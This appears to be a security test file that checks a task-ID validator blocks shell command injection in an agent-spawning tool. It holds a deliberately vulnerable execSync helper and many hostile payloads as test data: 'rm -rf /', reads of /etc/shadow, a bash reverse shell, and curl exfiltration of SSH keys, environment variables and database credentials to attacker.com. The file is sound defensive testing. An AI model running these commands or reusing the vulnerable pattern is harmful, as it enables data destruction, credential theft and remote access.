/**
 * Security Test: Command Injection Vulnerability (CVSS 7.5)
 *
 * Target: cfn-agent.ts line 51 - execSync with unsanitized taskId
 * Vulnerability: Command injection via malicious taskId in shell command
 * Attack Vector: taskId = "$(malicious command)" or "; rm -rf /" etc.
 * Impact: Remote code execution (RCE) with full process privileges
 *
 * TDD Protocol: All tests MUST FAIL before fix, PASS after fix
 * Status: FAILING TESTS (code not yet patched)
 */
import { describe, it, expect } from 'vitest';
import { execSync } from 'child_process';
import { validateTaskId } from '../../src/utils/path-validation';
/**
 * VULNERABLE: This mimics the actual vulnerable code pattern in cfn-agent.ts
 * DO NOT USE IN PRODUCTION - for testing only
 */
function spawnAgentVulnerable(agentType, taskId) {
    const cmd = `npx claude-flow-novice agent-spawn ${agentType} --task-id ${taskId}`;
    try {
        return execSync(cmd, { encoding: 'utf-8', timeout: 5000 });
    }
    catch (error) {
        return error.stdout || error.message || 'Agent execution failed';
    }
}
/**
 * SECURE: This is the patched version that validates input before shell execution
 */
function spawnAgentSecure(agentType, taskId) {
    // CRITICAL: Validate taskId BEFORE passing to shell
    validateTaskId(taskId);
    // Now safe to use in shell command
    const cmd = `npx claude-flow-novice agent-spawn ${agentType} --task-id ${taskId}`;
    try {
        return execSync(cmd, { encoding: 'utf-8', timeout: 5000 });
    }
    catch (error) {
        return error.stdout || error.message || 'Agent execution failed';
    }
}
describe('Security: Command Injection Prevention (CVSS 7.5)', () => {
    describe('Command Injection Attack Vectors', () => {
        it('should reject taskId with command substitution $()', () => {
            const maliciousTaskId = '$(whoami)';
            expect(() => validateTaskId(maliciousTaskId)).toThrow('Invalid taskId format');
        });
        it('should reject taskId with backtick command execution', () => {
            const maliciousTaskId = '`id`';
            expect(() => validateTaskId(maliciousTaskId)).toThrow('Invalid taskId format');
        });
        it('should reject taskId with pipe operator for command chaining', () => {
            const maliciousTaskId = 'task | cat /etc/passwd';
            expect(() => validateTaskId(maliciousTaskId)).toThrow('Invalid taskId format');
        });
        it('should reject taskId with semicolon for command separation', () => {
            const maliciousTaskId = 'task; rm -rf /';
            expect(() => validateTaskId(maliciousTaskId)).toThrow('Invalid taskId format');
        });
        it('should reject taskId with AND operator (&&)', () => {
            const maliciousTaskId = 'task && curl http://evil.com/shell.sh | bash';
            expect(() => validateTaskId(maliciousTaskId)).toThrow('Invalid taskId format');
        });
        it('should reject taskId with OR operator (||)', () => {
            const maliciousTaskId = 'task || cat /etc/shadow';
            expect(() => validateTaskId(maliciousTaskId)).toThrow('Invalid taskId format');
        });
        it('should reject taskId with redirection operator (>)', () => {
            const maliciousTaskId = 'task > /etc/passwd';
            expect(() => validateTaskId(maliciousTaskId)).toThrow('Invalid taskId format');
        });
        it('should reject taskId with input redirection (<)', () => {
            const maliciousTaskId = 'task < /etc/shadow';
            expect(() => validateTaskId(maliciousTaskId)).toThrow('Invalid taskId format');
        });
        it('should reject taskId with newline injection', () => {
            const maliciousTaskId = 'task\nmalicious_command';
            expect(() => validateTaskId(maliciousTaskId)).toThrow('Invalid taskId format');
        });
        it('should reject taskId with carriage return injection', () => {
            const maliciousTaskId = 'task\r\nmalicious_command';
            expect(() => validateTaskId(maliciousTaskId)).toThrow('Invalid taskId format');
        });
    });
    describe('spawnAgentSecure implementation', () => {
        it('should accept valid taskId validation without execution', () => {
            // This tests that validation passes for legitimate IDs
            const validTaskId = 'backend-developer-task-123';
            // Just validate without executing (execSync would fail in test env)
            expect(() => validateTaskId(validTaskId)).not.toThrow();
        });
        it('should reject command injection in secure function', () => {
            const maliciousTaskId = '$(whoami)';
            expect(() => spawnAgentSecure('backend-developer', maliciousTaskId)).toThrow('Invalid taskId format');
        });
        it('should reject semicolon injection in secure function', () => {
            const maliciousTaskId = 'task; rm -rf /';
            expect(() => spawnAgentSecure('backend-developer', maliciousTaskId)).toThrow('Invalid taskId format');
        });
        it('should reject pipe injection in secure function', () => {
            const maliciousTaskId = 'task | cat /etc/passwd';
            expect(() => spawnAgentSecure('backend-developer', maliciousTaskId)).toThrow('Invalid taskId format');
        });
    });
    describe('Real-world RCE scenarios', () => {
        it('Scenario 1: Delete all files', () => {
            const maliciousTaskId = '$(rm -rf /)';
            expect(() => validateTaskId(maliciousTaskId)).toThrow('Invalid taskId format');
        });
        it('Scenario 2: Reverse shell execution', () => {
            const maliciousTaskId = '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)';
            expect(() => validateTaskId(maliciousTaskId)).toThrow('Invalid taskId format');
        });
        it('Scenario 3: Data exfiltration via curl', () => {
            const maliciousTaskId = '$(curl http://attacker.com/exfil?data=$(cat /etc/passwd | base64))';
            expect(() => validateTaskId(maliciousTaskId)).toThrow('Invalid taskId format');
        });
        it('Scenario 4: Cryptocurrency miner installation', () => {
            const maliciousTaskId = '$(curl http://attacker.com/miner.sh | bash)';
            expect(() => validateTaskId(maliciousTaskId)).toThrow('Invalid taskId format');
        });
        it('Scenario 5: SSH key theft', () => {
            const maliciousTaskId = '$(cat ~/.ssh/id_rsa | curl -d @- http://attacker.com/exfil)';
            expect(() => validateTaskId(maliciousTaskId)).toThrow('Invalid taskId format');
        });
        it('Scenario 6: Environment variable exfiltration', () => {
            const maliciousTaskId = '$(env | curl -d @- http://attacker.com/envs)';
            expect(() => validateTaskId(maliciousTaskId)).toThrow('Invalid taskId format');
        });
        it('Scenario 7: Privilege escalation via sudo', () => {
            const maliciousTaskId = '$(sudo bash -c "cat /root/.ssh/id_rsa")';
            expect(() => validateTaskId(maliciousTaskId)).toThrow('Invalid taskId format');
        });
        it('Scenario 8: Database connection string theft', () => {
            const maliciousTaskId = '$(echo $DATABASE_URL | curl -d @- http://attacker.com/creds)';
            expect(() => validateTaskId(maliciousTaskId)).toThrow('Invalid taskId format');
        });
    });
    describe('Edge cases and encoding bypass attempts', () => {
        it('should reject taskId with hex encoding of command characters', () => {
            // \x24 is $, \x28 is (, \x29 is )
            const maliciousTaskId = '\\x24(whoami)';
            expect(() => validateTaskId(maliciousTaskId)).toThrow('Invalid taskId format');
        });
        it('should reject taskId with octal encoding', () => {
            const maliciousTaskId = '\\044(whoami)';
            expect(() => validateTaskId(maliciousTaskId)).toThrow('Invalid taskId format');
        });
        it('should reject taskId with mixed case shell commands', () => {
            const maliciousTaskId = '$(WhOaMi)';
            // Shell is case-insensitive for builtins - should still reject ($)
            expect(() => validateTaskId(maliciousTaskId)).toThrow('Invalid taskId format');
        });
        it('should reject taskId with comment to hide payload', () => {
            const maliciousTaskId = 'task #comment\nmalicious_command';
            expect(() => validateTaskId(maliciousTaskId)).toThrow('Invalid taskId format');
        });
        it('should reject taskId with whitespace variations', () => {
            const maliciousTaskId = 'task \n && \n rm -rf /';
            expect(() => validateTaskId(maliciousTaskId)).toThrow('Invalid taskId format');
        });
        it('should reject taskId with tabs and special whitespace', () => {
            const maliciousTaskId = 'task\t&&\trm\t-rf\t/';
            expect(() => validateTaskId(maliciousTaskId)).toThrow('Invalid taskId format');
        });
    });
    describe('Vulnerability comparison: vulnerable vs secure', () => {
        it('vulnerable function would execute command injection', () => {
            // This documents what WOULD happen without the fix
            // We don't actually call the vulnerable function in tests
            // (to avoid security risks in test execution)
            const maliciousTaskId = '$(echo "VULNERABLE")';
            // The vulnerable version would execute the command:
            // const result = spawnAgentVulnerable('agent', maliciousTaskId);
            // result would contain output of 'echo "VULNERABLE"'
            // Instead, secure version blocks it:
            expect(() => spawnAgentSecure('agent', maliciousTaskId)).toThrow('Invalid taskId format');
        });
        it('secure function blocks all command injection attempts', () => {
            const attackVectors = [
                '$(whoami)',
                '`id`',
                'task; whoami',
                'task | cat /etc/passwd',
                'task && curl http://evil.com/shell.sh | bash',
                'task || cat /etc/shadow',
                'task > /tmp/exfil.txt',
                'task < /etc/shadow',
                'task\n$(whoami)',
            ];
            for (const vector of attackVectors) {
                expect(() => spawnAgentSecure('agent', vector)).toThrow();
            }
        });
    });
    describe('Integration: cfn-agent.ts usage pattern', () => {
        it('should validate taskId in actual spawn pattern', () => {
            // This mimics how cfn-agent.ts should be structured
            const taskId = '$(malicious)';
            const agentType = 'backend-developer';
            // Step 1: Validate input BEFORE shell execution
            expect(() => {
                validateTaskId(taskId);
            }).toThrow('Invalid taskId format');
            // If validation passes, execution would be safe
            const safeTaskId = 'valid-task-id-123';
            expect(() => validateTaskId(safeTaskId)).not.toThrow();
        });
        it('should prevent exploitation of environment variables', () => {
            // Even if CFN_TASK_DESCRIPTION is unsanitized, taskId is protected
            const maliciousTaskId = '$(echo $CFN_TASK_DESCRIPTION | exfil)';
            expect(() => validateTaskId(maliciousTaskId)).toThrow('Invalid taskId format');
        });
    });
});
//# sourceMappingURL=command-injection-validation.test.js.map